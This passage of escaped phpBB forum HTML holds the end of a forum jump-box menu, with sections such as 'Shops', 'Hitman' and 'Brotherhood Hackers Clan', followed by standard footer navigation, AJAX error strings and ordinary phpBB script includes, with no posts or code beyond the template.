Keys</span></a></li>\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<li><a href=\"./viewforum.php?f=11\" class=\"jumpbox-sub-link\"><span class=\"spacer\"></span> <span> &#8627; &nbsp; Good Sites to go too</span></a></li>\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<li><a href=\"./viewforum.php?f=12\" class=\"jumpbox-sub-link\"><span class=\"spacer\"></span> <span> &#8627; &nbsp; Shops</span></a></li>\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<li><a href=\"./viewforum.php?f=13\" class=\"jumpbox-sub-link\"><span class=\"spacer\"></span> <span> &#8627; &nbsp; Hitman</span></a></li>\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<li><a href=\"./viewforum.php?f=9\" class=\"jumpbox-forum-link\"> <span> Gaming</span></a></li>\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<li><a href=\"./viewforum.php?f=21\" class=\"jumpbox-forum-link\"> <span> Brotherhood Hackers Clan</span></a></li>\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<li><a href=\"./viewforum.php?f=25\" class=\"jumpbox-sub-link\"><span class=\"spacer\"></span> <span> &#8627; &nbsp; Our Shops</span></a></li>\n\t\t\t\t\t\t\t\t\t\t\t</ul>\n\t\t</div>\n\t</div>\n\n\t</div>\n\n\t<div class=\"stat-block online-list\">\n\t\t<h3>Who is online</h3>\n\t\t<p>Users browsing this forum: No registered users and 1 guest</p>\n\t</div>\n\n\t\t\t</div>\n\n\n<div id=\"page-footer\" class=\"page-footer\" role=\"contentinfo\">\n\t<div class=\"navbar\" role=\"navigation\">\n\t<div class=\"inner\">\n\n\t<ul id=\"nav-footer\" class=\"nav-footer linklist\" role=\"menubar\">\n\t\t<li class=\"breadcrumbs\">\n\t\t\t\t\t\t\t\t\t<span class=\"crumb\"><a href=\"./index.php\" data-navbar-reference=\"index\"><i class=\"icon fa-home fa-fw\" aria-hidden=\"true\"></i><span>Board index</span></a></span>\t\t\t\t\t</li>\n\t\t\n\t\t\t\t<li class=\"rightside\">All times are <span title=\"UTC\">UTC</span></li>\n\t\t\t\t\t\t\t<li class=\"rightside\">\n\t\t\t\t<a href=\"./ucp.php?mode=delete_cookies\" data-ajax=\"true\" data-refresh=\"true\" role=\"menuitem\">\n\t\t\t\t\t<i class=\"icon fa-trash fa-fw\" aria-hidden=\"true\"></i><span>Delete all board cookies</span>\n\t\t\t\t</a>\n\t\t\t</li>\n\t\t\t\t\t\t\t\t\t\t\t\t<li class=\"rightside\" data-last-responsive=\"true\">\n\t\t\t\t<a href=\"./memberlist.php?mode=team\" role=\"menuitem\">\n\t\t\t\t\t<i class=\"icon fa-shield fa-fw\" aria-hidden=\"true\"></i><span>The team</span>\n\t\t\t\t</a>\n\t\t\t</li>\n\t\t\t\t\t\t\t\t\t<li class=\"rightside\" data-last-responsive=\"true\">\n\t\t\t\t<a href=\"./memberlist.php?mode=contactadmin\" role=\"menuitem\">\n\t\t\t\t\t<i class=\"icon fa-envelope fa-fw\" aria-hidden=\"true\"></i><span>Contact us</span>\n\t\t\t\t</a>\n\t\t\t</li>\n\t\t\t</ul>\n\n\t</div>\n</div>\n\n\t<div class=\"copyright\">\n\t\t\t\tPowered by <a href=\"https://www.phpbb.com/\">phpBB</a>&reg; Forum Software &copy; phpBB Limited\n\t\t\t\t\t\t\t\t\t</div>\n\n\t<div id=\"darkenwrapper\" class=\"darkenwrapper\" data-ajax-error-title=\"AJAX error\" data-ajax-error-text=\"Something went wrong when processing your request.\" data-ajax-error-text-abort=\"User aborted request.\" data-ajax-error-text-timeout=\"Your request timed out; please try again.\" data-ajax-error-text-parsererror=\"Something went wrong with the request and the server returned an invalid reply.\">\n\t\t<div id=\"darken\" class=\"darken\">&nbsp;</div>\n\t</div>\n\n\t<div id=\"phpbb_alert\" class=\"phpbb_alert\" data-l-err=\"Error\" data-l-timeout-processing-req=\"Request timed out.\">\n\t\t<a href=\"#\" class=\"alert_close\">\n\t\t\t<i class=\"icon fa-times-circle fa-fw\" aria-hidden=\"true\"></i>\n\t\t</a>\n\t\t<h3 class=\"alert_title\">&nbsp;</h3><p class=\"alert_text\"></p>\n\t</div>\n\t<div id=\"phpbb_confirm\" class=\"phpbb_alert\">\n\t\t<a href=\"#\" class=\"alert_close\">\n\t\t\t<i class=\"icon fa-times-circle fa-fw\" aria-hidden=\"true\"></i>\n\t\t</a>\n\t\t<div class=\"alert_text\"></div>\n\t</div>\n</div>\n\n</div>\n\n<div>\n\t<a id=\"bottom\" class=\"anchor\" accesskey=\"z\"></a>\n\t</div>\n\n<script type=\"text/javascript\" src=\"./assets/javascript/jquery.min.js?assets_version=2\"></script>\n<script type=\"text/javascript\" src=\"./assets/javascript/core.js?assets_version=2\"></script>\n\n\n\n<script type=\"text/javascript\" src=\"./styles/prosilver/template/forum_fn.js?assets_version=2\"></script>\n<script type=\"text/javascript\" src=\"./styles/prosilver/template/ajax.js?assets_version=2\"></script>\n\n\n\n</body>\n</html>\n"}